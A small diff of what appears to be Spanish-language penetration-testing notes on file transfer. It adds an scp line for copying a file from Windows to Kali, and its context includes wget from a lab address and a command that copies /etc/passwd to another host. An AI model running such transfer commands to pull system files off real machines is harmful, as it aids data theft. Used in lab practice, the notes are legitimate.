@@ -34,6 +34,7 @@ wget 192.168.49.128:8000/filetotransfer.txt
 ### SCP Upload
 ```python
 scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+scp archivo.txt usuario@192.168.1.100:/home/usuario (windows a kali)
 ```
 
 ### Certuil Tranferir archivos
